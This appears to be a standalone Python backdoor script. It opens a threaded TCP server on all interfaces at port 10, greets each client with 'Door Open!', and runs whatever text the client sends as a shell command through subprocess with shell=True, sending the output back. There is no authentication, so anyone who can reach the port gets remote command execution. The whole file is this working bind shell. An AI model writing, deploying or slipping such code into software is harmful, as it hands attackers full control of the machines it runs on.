#!/usr/bin/env python3

import sys
import textwrap
import socketserver
import string
import readline
import threading
from time import *

import getpass
import os
import subprocess


class Service(socketserver.BaseRequestHandler):
    def handle(self):
        self.send(b"Door Open!")

        while 1:
            command = self.receive(b"$ ")
            p = subprocess.Popen(
                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + b"\n"
        self.request.sendall(string)

    def receive(self, prompt=b"> "):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()

class ThreadedService(
		socketserver.ThreadingMixIn,
		socketserver.TCPServer,
		socketserver.DatagramRequestHandler,
):
	pass


def main():
    print("Starting server...")
    port = 10
    host = "0.0.0.0"

    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True

    server_thread = threading.Thread(target=server.serve_forever)

    server_thread.daemon = True
    server_thread.start()

    print("Server started on " + str(server.server_address) + "!")

    while True:
        sleep(10)


if __name__ == "__main__":
    main()